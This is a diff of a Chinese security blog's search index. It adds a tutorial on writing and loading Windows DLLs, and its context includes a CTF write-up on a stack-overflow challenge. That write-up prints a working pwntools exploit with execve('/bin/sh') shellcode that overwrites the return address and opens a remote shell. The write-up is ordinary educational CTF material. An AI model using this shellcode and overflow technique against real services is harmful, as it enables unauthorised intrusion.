@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Windows编程之动态链接库]]></title>
+    <url>%2F2018%2F09%2F30%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%2F</url>
+    <content type="text"><![CDATA[动态链接库动态链接库就是大家俗称的DLL文件，在windows系统中非常常见，是一个可以被其他程序共享的功能模块。动态连接库是不能直接执行的，它只能作为导出函数，被其他exe文件调用，一般我们都会说“导入/加载动态链接库”。 导出函数刚才说到了一个导出函数的概念，导出函数一般跟内部函数进行比较，内部函数就是在这个文件中内部定义的函数，只能这个文件来调用。而导出函数是在这个文件中定义，这个文件能够使用，但是别的文件也是同样可以使用的。 动态链接库编程动态链接库，顾名思义，是当程序执行的时候需要用到一些导出函数的时候才加载DLL文件，并且在使用之后会卸载掉，意味着可以节省内存。 在我们进行动态链接库编程的时候，首先需要编写DLL文件，可以用IDE新建一个动态链接库的项目，会自动生成一个DLLMain.cpp文件，里面有定义好的模版。 123456789101112131415BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 其中DLL_PROCESS_ATTACH是加载到内存的时候执行，DLL_THREAD_ATTACH是进程中有线程时执行，DLL_THREAD_DETACH是进程中线程被结束的时候执行，DLL_PROCESS_DETACH是从内存中卸载的时候执行。 我们想要定义自己的导出函数的话，就在main函数的上面或者下面都可以12345678910111213141516171819202122#include &quot;stdafx.h&quot;int MyMessageBox(char* lpText, char* lpCaption) &#123; MessageBoxA(NULL, lpText, lpCaption, 0); return 0;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 写好了定义的代码，我们还需要新建一个模版定义文件，是.def后缀的文件，其中声明要导出的函数名称12EXPORTS MyMessageBox 然后我们进行编译，就会得到dll文件了。 之后我们新建一个.c文件，定义main函数，来加载我们编译好的动态链接库文件。 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef int(*MyMessageBox)(char* lpText, char* lpCaption);int main(int argc, char* argv[]) &#123; HMODULE hModule = LoadLibrary(&quot;DLLP.dll&quot;); if (hModule == NULL) &#123; printf(&quot;LoadLibrary error\n&quot;); return 0; &#125; MyMessageBox NewMessageBox = (MyMessageBox)GetProcAddress(hModule, &quot;MyMessageBox&quot;); if (NewMessageBox == NULL) &#123; printf(&quot;GetProcAddress error\n&quot;); return 0; &#125; NewMessageBox(&quot;Hello, my friend.&quot;, &quot;Pino_HD&quot;); FreeLibrary(hModule); return 0;&#125; 代码中我们必须要先定义好我们需要引用的函数原型，在main函数中，使用LoadLibrary函数加载DLL文件，该函数会返回一个DLL文件的句柄，然后使用GetProcAddress获取导出函数的地址，其参数是之前返回的句柄，以及导出函数的名称。最后调用导出函数即可。当然了，最后不要忘记用FreeLibrary函数将句柄清空。 1gcc dllp.c -o dllp 编译之后执行可执行文件即可发现有弹窗。]]></content>
+      <categories>
+        <category>Windows编程</category>
+      </categories>
+      <tags>
+        <tag>Windows编程</tag>
+        <tag>动态链接库</tag>
+        <tag>DLL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[实验吧piolt(栈溢出)Writeup]]></title>
     <url>%2F2018%2F09%2F28%2F%E5%AE%9E%E9%AA%8C%E5%90%A7piolt%E6%A0%88%E6%BA%A2%E5%87%BAWriteup%2F</url>
     <content type="text"><![CDATA[前言最近闲来无事，准备开始学习一波pwn，先从最基本的栈溢出开始学起，在实验吧中找了一道基础的栈溢出题目做了做，收获颇多。 解题思路根据题目要求，nc连接远程服务器 发现一些文字，以及一个Location的地址，还有一个可以输入的Command命令，随便输入一个ls告诉我任务失败。同时还给了一个附件，是这个程序的可执行文件，先利用file命令查看文件的格式是一个64位的程序，然后在checksec看一下有什么防护emmmm,什么防护也没有，很好。直接放入IDA中，找到main函数，F5进行反汇编。 通过阅读代码，发现了read函数存在栈溢出。程序在最开始的时候生命了buf数组，大小为0x20，也就是32，在执行read函数的时候，读取了0x40，也就是64位，很明显的栈溢出。 其中给了一个Location，发现是buf的地址，那么情况就很明了了，我们可以在buf区开始写shellcode，然后利用padding覆盖到返回地址，在返回地址的地方写上这个buf的地址，这样程序在返回的时候就可以返回到buf的地址，从而执行我们写的shellcode了。 由代码我们知道，buf的长度是0x20，也就是32字节，这个是64位的程序，也就是说1粒度是8个字节，那么buf是局部变量，栈上紧跟着是调用者的ebp（32-40），之后就是返回地址了（40-48），因此我们只要确保40之后是那个buf的地址就好了 Payload1234567891011121314from pwn import *context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)r = remote(&apos;106.2.25.7&apos;, &apos;8003&apos;)r.recvuntil(&apos;Location:&apos;)l = int(r.recvuntil(&apos;\n&apos;)[:-1], 16)shellcode = &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;print disasm(shellcode)payload = shellcode + (40 - len(shellcode)) * &apos;A&apos; + p64(l)print len(shellcode)r.recvuntil(&quot;Command:&quot;)r.sendline(payload)r.interactive() 得到shell后，进入/home目录，得到flag]]></content>
@@ -518,8 +531,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -530,8 +543,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -566,8 +579,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>小贴士</tag>
         <tag>Linux</tag>
+        <tag>小贴士</tag>
       </tags>
   </entry>
   <entry>
@@ -630,8 +643,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>Linux</tag>
         <tag>后渗透</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
